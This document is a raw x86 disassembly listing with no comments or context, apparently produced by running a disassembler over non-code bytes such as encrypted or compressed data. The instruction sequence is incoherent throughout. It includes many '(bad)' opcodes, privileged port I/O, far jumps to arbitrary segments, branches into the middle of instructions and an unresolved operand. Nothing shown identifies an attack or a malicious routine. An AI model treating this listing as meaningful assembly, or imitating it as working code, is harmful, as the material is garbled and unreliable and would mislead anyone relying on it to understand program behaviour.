  417131:	mov    edx,0xd09a20d1
  417136:	xor    al,0x48
  417138:	pop    esp
  417139:	das    
  41713a:	xor    ch,BYTE PTR [edx]
  41713c:	sbb    dl,BYTE PTR cs:[edi+0x203a77d4]
  417143:	test   BYTE PTR [ecx+ebp*2+0x67],ah
  417147:	and    ecx,eax
  417149:	or     BYTE PTR [edi+0x74],cl
  41714c:	push   edx
  41714d:	push   ds
  41714e:	push   ebp
  41714f:	das    
  417150:	imul   ebp,DWORD PTR [ebp-0x3f1e4c31],0x13
  417157:	sbb    BYTE PTR [ebp+ebp*1-0x2c],0xaa
  41715c:	or     ch,dh
  41715e:	mov    ebp,0xf802eb69
  417163:	pop    ds
  417164:	mov    ebx,0xae8bb8a8
  417169:	std    
  41716a:	push   edx
  41716b:	int    0x7c
  41716d:	ja     0x417156
  41716f:	aaa    
  417170:	les    ebp,FWORD PTR [ebp+0x4698289e]
  417176:	sahf   
  417177:	pop    esp
  417178:	cmp    al,0x6a
  41717a:	cdq    
  41717b:	push   ebp
  41717c:	mov    al,BYTE PTR [eax-0x4070fb79]
  417182:	sti    
  417183:	pop    es
  417184:	stos   DWORD PTR es:[edi],eax
  417185:	cmp    bh,cl
  417187:	cmp    al,0xf8
  417189:	fild   DWORD PTR [ebx-0x5b]
  41718c:	jo     0x4171f0
  41718e:	push   es
  41718f:	add    al,BYTE PTR fs:[eax-0x1b0a7f02]
  417196:	jg     0x417168
  417198:	push   edi
  417199:	pop    esi
  41719a:	xchg   ebp,eax
  41719b:	jle    0x41712e
  41719d:	mov    edx,0x2b81ec2f
  4171a2:	and    al,bh
  4171a4:	fnstcw WORD PTR [ebp-0x11]
  4171a7:	lods   al,BYTE PTR ds:[esi]
  4171a8:	add    BYTE PTR ds:0x6ea87e9c,al
  4171ae:	test   BYTE PTR [ebx+eiz*8+0x62e91576],0x5f
  4171b6:	das    
  4171b7:	dec    esp
  4171b8:	jl     0x4171a1
  4171ba:	ret    0x5633
  4171bd:	ftst   
  4171bf:	mov    al,0xeb
  4171c1:	mov    ds:0xf9f878b8,eax
  4171c6:	popf   
  4171c7:	xchg   bl,dh
  4171c9:	loope  0x41719f
  4171cb:	loope  0x4171af
  4171cd:	fs cs jmp 0x5f4f0c0a
  4171d4:	xor    al,BYTE PTR [edi+ebx*8-0x2c]
  4171d8:	mov    eax,0x340cef48
  4171dd:	mov    ds:0xfb6970d8,al
  4171e2:	out    dx,al
  4171e3:	mov    cl,0x9a
  4171e5:	xlat   BYTE PTR ds:[ebx]
  4171e6:	ror    BYTE PTR [esi],0xfb
  4171e9:	lods   eax,DWORD PTR ds:[esi]
  4171ea:	out    0x20,al
  4171ec:	ins    DWORD PTR es:[edi],dx
  4171ed:	cmp    DWORD PTR [esi+0x65],0x63
  4171f1:	sbb    bl,BYTE PTR [ecx-0x59e12fbe]
  4171f7:	xor    DWORD PTR [ecx+0x55],ebp
  4171fa:	fld    TBYTE PTR [esi+0x1]
  4171fd:	jb     0x41727e
  4171ff:	and    BYTE PTR [eax+0x2a91764f],bh
  417205:	mov    ds:0xfc31c8fb,al
  41720a:	jno    0x4171c4
  41720c:	and    DWORD PTR [eax-0x11],ebx
  41720f:	pop    esi
  417210:	ja     0x417198
  417212:	jbe    0x4171c2
  417214:	dec    edi
  417215:	push   esi
  417216:	ds fdivp st(2),st
  41721a:	adc    BYTE PTR [edx+0xe],bl
  41721d:	in     eax,0x60
  41721f:	jmp    0x79046c4f
  417224:	test   BYTE PTR [ecx+0x38],ah
  417227:	imul   ebx,DWORD PTR [esi-0x4],0x7a78bd7d
  41722e:	lock jae 0x4171ef
  417231:	or     eax,0x81dd629
  417236:	dec    edi
  417237:	jl     0x41726b
  417239:	stc    
  41723a:	mov    bh,0xa8
  41723c:	inc    ah
  41723e:	and    dh,BYTE PTR [ebp+0x8]
  417241:	cmp    ebx,DWORD PTR [ecx]
  417243:	aam    0x0
  417245:	mov    edx,0xb39bfe1d
  41724a:	cmp    eax,edi
  41724c:	pop    edx
  41724d:	or     DWORD PTR [ebx],edi
  41724f:	dec    ecx
  417250:	inc    ebx
  417251:	pop    ss
  417252:	xor    dl,BYTE PTR [eax-0xed3001c]
  417258:	or     esp,0xe65e509f
  41725e:	xchg   ebx,eax
  41725f:	mov    esi,0x7b773764
  417264:	mov    bh,0x6b
  417266:	int3   
  417267:	in     eax,dx
  417268:	fldenv [edi]
  41726a:	lods   eax,DWORD PTR ds:[esi]
  41726b:	stc    
  41726c:	rcl    dh,1
  41726e:	xchg   esi,eax
  41726f:	shl    cl,1
  417271:	out    dx,eax
  417272:	addr16 sbb eax,0x83b26bce
  417278:	or     esp,DWORD PTR [edx]
  41727a:	jecxz  0x417239
  41727c:	fstp   DWORD PTR [edi+0x29bedf5f]
  417282:	push   edi
  417283:	mov    cl,0x93
  417285:	push   0xffffffc0
  417287:	xchg   edi,eax
  417288:	xor    bl,BYTE PTR [ebp-0x5af6769c]
  41728e:	pushf  
  41728f:	xchg   edi,eax
  417290:	jbe    0x417286
  417292:	mov    ecx,0xe22b7932
  417297:	xchg   ebx,eax
  417298:	mov    edx,0x226ca19
  41729d:	jbe    0x417263
  41729f:	and    eax,0xcb625ac0
  4172a4:	or     edi,esp
  4172a6:	je     0x417272
  4172a8:	push   edi
  4172a9:	popf   
  4172aa:	sbb    eax,0x99f3890e
  4172af:	ins    BYTE PTR es:[edi],dx
  4172b0:	mov    ch,0x1b
  4172b2:	mov    ds:0xcfdb3eb7,al
  4172b7:	mov    bl,dl
  4172b9:	stos   DWORD PTR es:[edi],eax
  4172ba:	push   eax
  4172bb:	lahf   
  4172bc:	fwait
  4172bd:	repnz add esp,DWORD PTR [ebp+0xf]
  4172c1:	clc    
  4172c2:	pusha  
  4172c3:	pop    esi
  4172c4:	and    edx,ebp
  4172c6:	repz (bad) 
  4172c8:	xchg   ebx,eax
  4172c9:	dec    eax
  4172ca:	or     BYTE PTR [ecx-0x44],dh
  4172cd:	stos   BYTE PTR es:[edi],al
  4172ce:	or     eax,0x9029b049
  4172d3:	and    BYTE PTR [eax+0x14],bh
  4172d6:	mov    ah,0x50
  4172d8:	pop    ebx
  4172d9:	mov    bl,0x2f
  4172db:	lea    esp,[eax]
  4172dd:	add    eax,0xdcec28cc
  4172e2:	jo     0x4172cc
  4172e4:	pop    eax
  4172e5:	fucom  st(6)
  4172e7:	pop    esp
  4172e8:	push   ebp
  4172e9:	(bad)
  4172ed:	adc    al,0x99
  4172ef:	das    
  4172f0:	ins    DWORD PTR es:[edi],dx
  4172f1:	dec    edx
  4172f2:	movupd xmm7,xmm0
  4172f6:	or     bh,BYTE PTR [eax-0x4e6bb8]
  4172fc:	(bad)  
  4172fd:	dec    esp
  4172fe:	xor    bl,cl
  417300:	mov    esi,0x763e5dc
  417305:	in     eax,0x5d
  417307:	repz jmp 0x4a4acb2f
  41730d:	jns    0x4172cf
  41730f:	and    bh,bl
  417311:	mov    dl,0x3c
  417313:	ins    BYTE PTR es:[edi],dx
  417314:	(bad)  
  417315:	push   eax
  417316:	cwde   
  417317:	es sti 
  417319:	mov    cl,0xe1
  41731b:	pop    ecx
  41731c:	mov    ebp,ebx
  41731e:	loop   0x41734a
  417320:	mov    ebx,0x48271407
  417325:	mov    ecx,0x81fffdeb
  41732a:	pop    esi
  41732b:	or     DWORD PTR [edi-0x12],0xffffff89
  41732f:	jp     0x4172d0
  417331:	outs   dx,BYTE PTR ds:[esi]
  417332:	mov    dh,BYTE PTR [edi+0x78dbfbc2]
  417338:	and    dh,BYTE PTR [esi-0x47]
  41733b:	out    dx,eax
  41733c:	cmp    eax,0xa6adecc0
  417341:	pop    es
  417342:	add    dl,BYTE PTR [ecx+0x5d]
  417345:	inc    esp
  417346:	inc    edi
  417347:	rcl    bh,0x94
  41734a:	cmc    
  41734b:	imul   ecx,DWORD PTR [ebp-0x6785e158],0x4c1f74f0
  417355:	mov    edx,0x8c36ac4
  41735a:	and    al,0x29
  41735c:	cwde   
  41735d:	adc    ebx,DWORD PTR [edx]
  41735f:	xor    DWORD PTR [eax+0xf],0x4919aea8
  417366:	xchg   edx,eax
  417367:	adc    edx,ecx
  417369:	leave  
  41736a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41736b:	dec    bh
  41736d:	jae    0x4172fb
  41736f:	(bad)  [edi-0x4e]
  417372:	shl    BYTE PTR [ecx-0x5d],0xd3
  417376:	mov    bl,0x9d
  417378:	mov    dh,0xed
  41737a:	out    dx,eax
  41737b:	and    bl,ah
  41737d:	lea    ebx,[edi]
  41737f:	lods   eax,DWORD PTR ds:[esi]
  417380:	call   0x5898:0xc563d371
  417387:	fs dec edx
  417389:	xchg   DWORD PTR [edi],ebx
  41738b:	sub    eax,0xad175011
  417390:	sub    ecx,edi
  417392:	imul   edi,ebx,0xbd91e180
  417398:	fdivr  st(1),st
  41739a:	dec    esi
  41739b:	mov    cl,BYTE PTR [ebp+0x3c]
  41739e:	mov    ebx,0xd68fc2a3
  4173a3:	and    ebx,DWORD PTR [edx+0x6]
  4173a6:	jb     0x41735f
  4173a8:	retf   
  4173a9:	add    eax,0xc7001c35
  4173ae:	adc    eax,0x8d581726
  4173b3:	in     eax,0xec
  4173b5:	or     eax,0xb1f51887
  4173ba:	cmp    esi,eax
  4173bc:	jb     0x41739a
  4173be:	ins    DWORD PTR es:[edi],dx
  4173bf:	fstp   TBYTE PTR [ebp+0x4fb9cb85]
  4173c5:	aad    0x72
  4173c7:	aas    
  4173c8:	jmp    0x417407
  4173ca:	or     eax,0x6e737522
  4173cf:	push   ss
  4173d0:	sub    bl,ah
  4173d2:	retf   0x244
  4173d5:	gs ss lock push ebp
  4173d9:	sub    al,0x3c
  4173db:	fs push eax
  4173dd:	ret    0x946
  4173e0:	repnz push edx
  4173e2:	loope  0x41740f
  4173e4:	dec    ebp
  4173e5:	mov    esi,0x672a49ba
  4173ea:	add    DWORD PTR [esi],esp
  4173ec:	cwde   
  4173ed:	ins    BYTE PTR es:[edi],dx
  4173ee:	or     al,BYTE PTR [eax+eax*2]
  4173f1:	call   0x29cb8c65
  4173f6:	iret   
  4173f7:	mov    DWORD PTR [ebx-0x4ed17eba],esp
  4173fd:	repz sub DWORD PTR [eax],edx
  417400:	pop    edi
  417401:	mov    BYTE PTR [ebx-0x5d],al
  417404:	mov    WORD PTR [edx+0x35],gs
  417407:	neg    DWORD PTR [esi-0xb]
  41740a:	data16 fimul DWORD PTR [eax-0x5f]
  41740e:	ja     0x4173c2
  417410:	call   0x8b4c41ac
  417415:	xchg   ecx,eax
  417416:	ja     0x41747a
  417418:	xor    eax,0xb4baf1f1
  41741d:	fnstsw WORD PTR [ebp+eiz*1-0x13f58d80]
  417424:	push   ecx
  417425:	jmp    0xa18e:0x5d9c6d44
  41742c:	push   ebp
  41742d:	ret    
  41742e:	sahf   
  41742f:	out    0x1e,al
  417431:	push   esp
  417432:	(bad)  
  417433:	jp     0x417406
  417435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417436:	sub    ebx,eax
  417438:	mov    ecx,0x9ceb1423
  41743d:	add    ebx,DWORD PTR [ebp-0x56]
  417440:	aas    
  417441:	repnz rol ebp,0x54
  417445:	push   0xf776c2cb
  41744a:	push   esp
  41744b:	pop    eax
  41744c:	push   es
  41744d:	fnstenv [ebx-0x46a43f99]
  417453:	add    DWORD PTR [edx-0x6a],edi
  417456:	xor    DWORD PTR [ebp+ebx*8-0x1e],ebp
  41745a:	cdq    
  41745b:	ins    DWORD PTR es:[edi],dx
  41745c:	inc    ecx
  41745d:	(bad)  
  41745e:	scas   al,BYTE PTR es:[edi]
  41745f:	loope  0x417410
  417461:	pop    ds
  417462:	and    eax,0x6dff9fa1
  417467:	push   cs
  417468:	hlt    
  417469:	dec    ebx
  41746a:	and    BYTE PTR [ecx-0x54],bh
  41746d:	in     eax,dx
  41746e:	lock loope 0x41749c
  417471:	clc    
  417472:	scas   al,BYTE PTR es:[edi]
  417473:	push   ecx
  417474:	das    
  417475:	pop    ebx
  417476:	(bad)
  417479:	repnz sub eax,0xdfa799db
  41747f:	jmp    0x417480
  417481:	js     0x417419
  417483:	call   0x8441f93b
  417488:	mov    bl,0x5b
  41748a:	sbb    DWORD PTR [ebx],0x35
  41748d:	lahf   
  41748e:	jle    0x417427
  417490:	imul   BYTE PTR [ebp-0x3942e4aa]
  417496:	call   0xac28:0x59bf6119
  41749d:	test   al,0xa1
  41749f:	sbb    cl,ah
  4174a1:	imul   eax,DWORD PTR [edi],0x8fff24a9
  4174a7:	add    BYTE PTR [ebp-0x41],cl
  4174aa:	and    al,0x7a
  4174ac:	xor    BYTE PTR [ecx-0x3c84fdf3],ch
  4174b2:	inc    edi
  4174b3:	jmp    0x417513
  4174b5:	and    DWORD PTR [ecx+0x2510e62c],ebx
  4174bb:	adc    cl,BYTE PTR [edx+0x3c]
  4174be:	adc    al,0x8b
  4174c0:	pop    esp
  4174c1:	cmp    ebx,DWORD PTR [esi]
  4174c3:	jecxz  0x41751f
  4174c5:	aad    0xd
  4174c7:	push   es
  4174c8:	sub    BYTE PTR [ecx-0x6fed8ea7],bl
  4174ce:	(bad)  
  4174cf:	sbb    dl,dh
  4174d1:	aaa    
  4174d2:	push   esi
  4174d3:	fwait
  4174d4:	out    0x78,eax
  4174d6:	jge    0x417501
  4174d8:	pop    esp
  4174d9:	adc    eax,0xb326d644
  4174de:	push   edi
  4174df:	cmc    
  4174e0:	inc    esi
  4174e1:	sub    esp,DWORD PTR [eax]
  4174e3:	jne    0x4174f5
  4174e5:	not    DWORD PTR ss:[edx+0x32]
  4174e9:	mov    BYTE PTR [ebx-0xb9770b],cl
  4174ef:	xchg   ebp,eax
  4174f0:	ins    BYTE PTR es:[edi],dx
  4174f1:	loope  0x417512
  4174f3:	loope  0x417572
  4174f5:	je     0x41749e
  4174f7:	adc    esi,esi
  4174f9:	inc    edi
  4174fa:	ret    
  4174fb:	int    0xfa
  4174fd:	ret    0x225a
  417500:	inc    esp
  417501:	or     DWORD PTR [edi],ebx
  417503:	aad    0x58
  417505:	mov    WORD PTR [ebx],?
  417507:	sbb    ecx,DWORD PTR [ecx+0x5f5eb6c7]
  41750d:	mov    bh,0x1
  41750f:	(bad)  
  417510:	out    dx,al
  417511:	dec    ebx
  417512:	aaa    
  417513:	and    al,0x10
  417515:	xchg   edi,eax
  417516:	int    0xae
  417518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417519:	jecxz  0x417535
  41751b:	test   al,0x39
  41751d:	jnp    0x417589
  41751f:	cmp    BYTE PTR [ebx],dh
  417521:	fs dec edx
  417523:	dec    edi
  417524:	clc    
  417525:	aad    0xda
  417527:	mov    bh,0x77
  417529:	mov    ah,BYTE PTR [eax+0x48add01c]
  41752f:	xor    edi,edx
  417531:	jp     0x417525
  417533:	popa   
  417534:	pop    edx
  417535:	fcomp  DWORD PTR [ebp-0x42d55141]
  41753b:	dec    ecx
  41753c:	xor    dh,BYTE PTR [eax+0x112cdb6d]
  417542:	or     cl,ah
  417544:	pop    ecx
  417545:	ret    
  417546:	jno    0x417567
  417548:	leave  
  417549:	and    BYTE PTR [edi+0x5f],ch
  41754c:	arpl   WORD PTR [esi],ax
  41754e:	pop    edi
  41754f:	out    0x9a,al
  417551:	cmp    BYTE PTR [ecx-0x29cd7b45],ah
  417557:	dec    ecx
  417558:	pop    esi
  417559:	inc    ebx
  41755a:	mov    ds:0x3e6e9296,eax
  41755f:	jp     0x41756f
  417561:	sub    eax,esp
  417563:	out    0xff,eax
  417565:	xor    ch,BYTE PTR [edx+0x32cda3c5]
  41756b:	mov    ecx,0x36038d11
  417570:	rcr    ah,0x8f
  417573:	jns    0x4175e5
  417575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417576:	lods   al,BYTE PTR ds:[esi]
  417577:	mov    ch,0xa4
  417579:	outs   dx,DWORD PTR ds:[esi]
  41757a:	sbb    esp,esi
  41757c:	ret    
  41757d:	jle    0x417570
  41757f:	jecxz  0x417554
  417581:	mov    esi,0xbcf37211
  417586:	ja     0x4175be
  417588:	das    
  417589:	cmp    dh,bl
  41758b:	sti    
  41758c:	lahf   
  41758d:	or     cl,BYTE PTR [ecx+0x68e0146d]
  417593:	push   ebp
  417594:	mov    dh,0x69
  417596:	leave  
  417597:	jae    0x417581
  417599:	ja     0x41752b
  41759b:	ins    BYTE PTR es:[edi],dx
  41759c:	aam    0x32
  41759e:	lea    edi,[edi+0x48]
  4175a1:	dec    ecx
  4175a2:	repz dec esi
  4175a4:	sbb    eax,DWORD PTR [ebp-0x37]
  4175a7:	push   0xffffffe6
  4175a9:	sub    dh,ah
  4175ab:	in     eax,0x99
  4175ad:	xchg   BYTE PTR [eax-0x38b064a2],al
  4175b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b4:	or     ebp,ebp
  4175b6:	scas   al,BYTE PTR es:[edi]
  4175b7:	adc    ah,BYTE PTR [eax+0x75e5fad9]
  4175bd:	popf   
  4175be:	mov    ecx,0x78fd2822
  4175c3:	shl    DWORD PTR [edx-0x42c60ed6],1
  4175c9:	fimul  WORD PTR [ebx]
  4175cb:	xchg   ebp,eax
  4175cc:	sbb    BYTE PTR [edx],bl
  4175ce:	out    0xb,eax
  4175d0:	std    
  4175d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175d2:	xchg   esp,eax
  4175d3:	fdiv   QWORD PTR [ecx-0x38]
  4175d6:	rol    dh,0x3d
  4175d9:	jb     0x4175f6
  4175db:	jnp    0x417586
  4175dd:	(bad)  
  4175de:	jl     0x417566
  4175e0:	or     al,0x66
  4175e2:	mov    bh,0x1b
  4175e4:	(bad)  
  4175e5:	xchg   esp,eax
  4175e6:	xchg   ebx,eax
  4175e7:	pop    es
  4175e8:	jl     0x4175df
  4175ea:	pusha  
  4175eb:	fistp  DWORD PTR [edx]
  4175ed:	push   ecx
  4175ee:	sti    
  4175ef:	aam    0x7b
  4175f1:	mov    cl,0x6
  4175f3:	lds    eax,FWORD PTR [ebp-0x6712f2b]
  4175f9:	cmc    
  4175fa:	imul   ecx,ebp,0xffffffe8
  4175fd:	loopne 0x41760a
  4175ff:	jnp    0x417672
  417601:	into   
  417602:	fisubr DWORD PTR [esi+ebp*4]
  417605:	sub    DWORD PTR [ebp-0x9],0x35340d0b
  41760c:	inc    edx
  41760d:	pop    ss
  41760e:	add    cl,BYTE PTR [eax-0x8e3fe1]
  417614:	mov    ah,0xce
  417616:	out    dx,al
  417617:	mov    eax,0x6c540e31
  41761c:	arpl   WORD PTR [eax-0x32],si
  41761f:	sbb    ecx,edi
  417621:	cwde   
  417622:	enter  0xc3c4,0x59
  417626:	push   ss
  417627:	sbb    DWORD PTR [ecx+0x7d5dac2b],ebp
  41762d:	or     al,0x16
  41762f:	les    ebx,FWORD PTR ss:[ebx]
  417632:	mov    ah,0xae
  417634:	mov    bh,0x33
  417636:	mov    dh,0x19
  417638:	in     al,dx
  417639:	div    dh
  41763b:	clc    
  41763c:	mov    gs,ebp
  41763e:	rol    BYTE PTR ds:0xf4a15862,0xaa
  417645:	loopne 0x4176a1
  417647:	ins    DWORD PTR es:[edi],dx
  417648:	fstp   TBYTE PTR [edi]
  41764a:	adc    BYTE PTR [eax+0x2f],bl
  41764d:	addr16 in al,dx
  41764f:	jno    0x417671
  417651:	sbb    ah,BYTE PTR [esi+ecx*4]
  417654:	push   esp
  417655:	cs add esp,ecx
  417658:	jnp    0x417633
  41765a:	cld    
  41765b:	out    dx,al
  41765c:	(bad)  
  41765d:	call   0x5f8d848d
  417662:	(bad)  
  417663:	xchg   esi,eax
  417664:	cmp    edi,DWORD PTR [edx+0x16]
  417667:	ds in  al,0xab
  41766a:	sub    cl,dh
  41766c:	shr    DWORD PTR [ebx+0x46],1
  41766f:	push   esi
  417670:	addr16 mov fs:0x46ff,eax
  417675:	push   eax
  417676:	in     al,dx
  417677:	int3   
  417678:	mov    bl,0xc1
  41767a:	fisttp WORD PTR [edi-0x16]
  41767d:	fiadd  DWORD PTR [edi+edx*1-0x5bee099b]
  417684:	cmp    BYTE PTR [edi],bh
  417686:	mov    ebx,0x82df47b6
  41768b:	pop    ebp
  41768c:	pop    es
  41768d:	xchg   esi,eax
  41768e:	add    eax,0x1feee795
  417693:	jns    0x41766d
  417695:	inc    eax
  417696:	aas    
  417697:	or     ebx,DWORD PTR [eax-0xf]
  41769a:	ins    DWORD PTR es:[edi],dx
  41769b:	mov    es,WORD PTR [esi]
  41769d:	les    ebx,FWORD PTR [ecx+0x346456ed]
  4176a3:	cmp    al,0xf0
  4176a5:	cdq    
  4176a6:	lahf   
  4176a7:	in     al,dx
  4176a8:	sub    DWORD PTR [ecx+0x69f8f259],ebx
  4176ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176af:	xchg   edx,eax
  4176b0:	mov    ecx,0x8f3d2ca7
  4176b5:	and    DWORD PTR [esi-0x6e],0xfffffff7
  4176b9:	popf   
  4176ba:	push   eax
  4176bb:	xchg   ebp,eax
  4176bc:	mov    ds:0xac7cd433,al
  4176c1:	loop   0x417694
  4176c3:	cmp    esi,DWORD PTR [ecx-0x5b]
  4176c6:	bound  eax,QWORD PTR [edx+0x73]
  4176c9:	pop    ebp
  4176ca:	sub    BYTE PTR [ecx+0x594eb353],bh
  4176d0:	jb     0x417704
  4176d2:	outs   dx,DWORD PTR ds:[esi]
  4176d3:	outs   dx,DWORD PTR ds:[esi]
  4176d4:	in     eax,0xb2
  4176d6:	push   esi
  4176d7:	and    bl,0x27
  4176da:	je     0x41773f
  4176dc:	call   0x742dda16
  4176e1:	out    0x9a,eax
  4176e3:	adc    cl,al
  4176e5:	in     eax,0x1a
  4176e7:	jns    0x4176dc
  4176e9:	daa    
  4176ea:	xchg   ebp,eax
  4176eb:	scas   al,BYTE PTR es:[edi]
  4176ec:	ud1    esp,esp
  4176ef:	movhps xmm4,QWORD PTR [edi-0x25]
  4176f3:	rcr    DWORD PTR [esi+0x5f],1
  4176f6:	sbb    eax,0x2a74b1e9
  4176fb:	daa    
  4176fc:	call   0xb085:0x408e0169
  417703:	dec    edi
  417704:	push   ss
  417705:	xor    eax,0xfb33de0f
  41770a:	xchg   DWORD PTR [esi-0x4e979ce8],esi
  417710:	ds nop
  417712:	ror    DWORD PTR [ecx-0x33b577e2],1
  417718:	shl    eax,0x5c
  41771b:	inc    eax
  41771c:	xchg   esp,eax
  41771d:	retf   0x8bc9
  417720:	push   edx
  417721:	mov    cl,0x59
  417723:	jmp    0x4176af
  417725:	daa    
  417726:	nop
  417727:	sbb    al,0xda
  417729:	dec    ebx
  41772a:	push   esi
  41772b:	xchg   esi,eax
  41772c:	ds aad 0xba
  41772f:	sbb    eax,0xeb412f04
  417734:	adc    eax,DWORD PTR [ecx]
  417736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417737:	cs pop edi
  417739:	cmp    DWORD PTR [edx+edx*2-0x30],0x4e30ebea
  417741:	iret   
  417742:	xchg   esi,eax
  417743:	in     eax,dx
  417744:	xchg   esi,eax
  417745:	pop    ebx
  417746:	cdq    
  417747:	xchg   esi,eax
  417748:	fstp   QWORD PTR [ebx-0x1a]
  41774b:	mov    eax,0x59df162b
  417750:	push   esp
  417751:	xor    al,0xcc
  417753:	jnp    0x4177b2
  417755:	rcr    BYTE PTR [eax+0x40],1
  417758:	sub    BYTE PTR [edi+0x78],bl
  41775b:	lock push esi
  41775d:	das    
  41775e:	push   cs
  41775f:	in     al,dx
  417760:	mov    al,0x6b
  417762:	nop
  417763:	cmp    eax,0x214a3db2
  417768:	or     DWORD PTR [ebx],esp
  41776a:	cmp    bh,BYTE PTR [edx+ebx*2]
  41776d:	shl    eax,1
  41776f:	(bad)  
  417770:	mov    ebx,0x4454763e
  417775:	jne    0x4177ec
  417777:	retf   0xfa8c
  41777a:	test   al,0xe9
  41777c:	mov    edx,DWORD PTR [ebx]
  41777e:	je     0x4177d0
  417780:	fnstcw WORD PTR [edi+0x41]
  417783:	jge    0x4177a2
  417785:	jg     0x41778e
  417787:	arpl   WORD PTR [eax-0x3708b396],bp
  41778d:	add    DWORD PTR [ecx+ecx*2-0x6c02fc51],esi
  417794:	out    dx,al
  417795:	leave  
  417796:	jg     0x41779a
  417798:	in     al,dx
  417799:	out    0x3f,al
  41779b:	in     eax,dx
  41779c:	dec    esi
  41779d:	cmp    ch,BYTE PTR [esp+eax*1+0x1401fe11]
  4177a4:	in     al,dx
  4177a5:	inc    ebp
  4177a6:	push   ss
  4177a7:	jb     0x4177ba
  4177a9:	lods   al,BYTE PTR ds:[esi]
  4177aa:	dec    ebx
  4177ab:	out    0x59,eax
  4177ad:	sahf   
  4177ae:	inc    esi
  4177af:	mov    edx,0x2704c337
  4177b4:	pop    esi
  4177b5:	mov    bl,0x2d
  4177b7:	ins    DWORD PTR es:[edi],dx
  4177b8:	xchg   BYTE PTR [ecx-0x3e],cl
  4177bb:	ror    BYTE PTR [ebx],1
  4177bd:	push   0xb18f80ba
  4177c2:	aad    0x4
  4177c4:	sbb    al,0xdc
  4177c6:	cs mov bl,0x70
  4177c9:	add    DWORD PTR ds:0x5509a6e0,ebx
  4177cf:	iret   
  4177d0:	dec    esp
  4177d1:	sub    eax,0x8ec4513b
  4177d6:	push   ds
  4177d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177d8:	stos   DWORD PTR es:[edi],eax
  4177d9:	push   eax
  4177da:	loope  0x41782f
  4177dc:	aas    
  4177dd:	stos   BYTE PTR es:[edi],al
  4177de:	(bad)  
  4177df:	shr    DWORD PTR [eax+esi*8+0x19d5d6d7],1
  4177e6:	jge    0x41784e
  4177e8:	es dec ebp
  4177ea:	loop   0x41781e
  4177ec:	jb     0x4177a9
  4177ee:	fidivr DWORD PTR [ebx]
  4177f0:	and    DWORD PTR [ecx+0x5b3e4c3],edx
  4177f6:	lods   al,BYTE PTR ds:[esi]
  4177f7:	xchg   esp,eax
  4177f8:	xchg   DWORD PTR [eax],eax
  4177fa:	(bad)  
  4177fb:	mov    edx,0x1c3e4104
  417800:	(bad)  
  417801:	std    
  417802:	xor    BYTE PTR [ecx],ah
  417804:	test   al,0xad
  417806:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  417808:	sahf   
  417809:	std    
  41780a:	inc    esp
  41780b:	sti    
  41780c:	pop    eax
  41780d:	data16 adc BYTE PTR es:[ebp-0xa954171],ch
  417815:	cdq    
  417816:	and    al,0x2c
  417818:	mov    ebp,0xdbc569d0
  41781d:	xor    DWORD PTR gs:[eax-0x62],edx
  417821:	xor    al,0xc
  417823:	retf   0xf9b0
  417826:	retf   0x9870
  417829:	inc    edx
  41782a:	dec    ecx
  41782b:	mov    DWORD PTR [edi+edi*1+0x65],ebp
  41782f:	cs fwait
  417831:	or     BYTE PTR [esi],0x9f
  417834:	xchg   DWORD PTR [edi-0x6f],esp
  417837:	inc    ebx
  417838:	repnz in al,0xab
  41783b:	ror    BYTE PTR [edx+0x523c5a52],cl
  417841:	test   DWORD PTR [ebx+0x7a],ebx
  417844:	adc    esp,DWORD PTR [ebp-0x7749deaa]
  41784a:	fdivp  st(7),st
  41784c:	inc    ebp
  41784d:	sub    eax,0xa1dde123
  417852:	mov    esp,ecx
  417854:	(bad)  
  417856:	inc    esi
  417857:	enter  0xdd6,0x27
  41785b:	leave  
  41785c:	push   ebp
  41785d:	pop    ebp
  41785e:	pop    ebx
  41785f:	push   esi
  417860:	jnp    0x417817
  417862:	fs jb  0x4177ec
  417865:	out    dx,al
  417866:	add    ah,dl
  417868:	in     al,0xe9
  41786a:	fisttp QWORD PTR [ecx]
  41786c:	(bad)  
  41786d:	mov    al,ds:0x4622bdf1
  417872:	mov    dl,0x20
  417874:	dec    esp
  417875:	cmc    
  417876:	dec    edx
  417877:	xchg   edx,eax
  417878:	ret    
  417879:	or     eax,0x198f3a3b
  41787e:	ret    
  41787f:	adc    al,0xd2
  417881:	dec    ecx
  417882:	lds    ecx,FWORD PTR [ebp-0x1a]
  417885:	(bad)  [edi-0x42]
  417888:	mov    dh,cl
  41788a:	(bad)  
  41788b:	xchg   esi,eax
  41788c:	add    al,0x58
  41788e:	pop    eax
  41788f:	hlt    
  417890:	je     0x417823
  417892:	and    esp,ecx
  417894:	jmp    0xdf8bd57b
  417899:	xchg   DWORD PTR ds:0x2296d221,edi
  41789f:	fcmovnbe st,st(7)
  4178a1:	sbb    DWORD PTR [ecx-0xd],edi
  4178a4:	or     eax,0xe29c4354
  4178a9:	mov    esi,DWORD PTR [esi-0x32]
  4178ac:	xchg   esi,eax
  4178ad:	imul   ecx,DWORD PTR [eax+ecx*4+0x4efcb616],0xaca1d83
  4178b8:	je     0x68811c9f
  4178be:	sub    dl,BYTE PTR [esi+0x315ae3c]
  4178c4:	xlat   BYTE PTR ds:[ebx]
  4178c5:	push   esi
  4178c6:	xor    eax,0x78a100eb
  4178cb:	fadd   st(7),st
  4178cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178ce:	out    dx,al
  4178cf:	test   BYTE PTR [ebx-0x40],dh
  4178d2:	add    al,0xb4
  4178d4:	aaa    
  4178d5:	ret    
  4178d6:	imul   DWORD PTR [edx-0x1b]
  4178d9:	clc    
  4178da:	inc    edi
  4178db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178dc:	pushaw 
  4178de:	stos   BYTE PTR es:[edi],al
  4178df:	push   cs
  4178e0:	adc    al,0x27
  4178e2:	aaa    
  4178e3:	jae    0x4178bb
  4178e5:	pop    es
  4178e6:	scas   eax,DWORD PTR es:[edi]
  4178e7:	xor    al,0xe4
  4178e9:	arpl   WORD PTR [edx+edx*1+0x64],cx
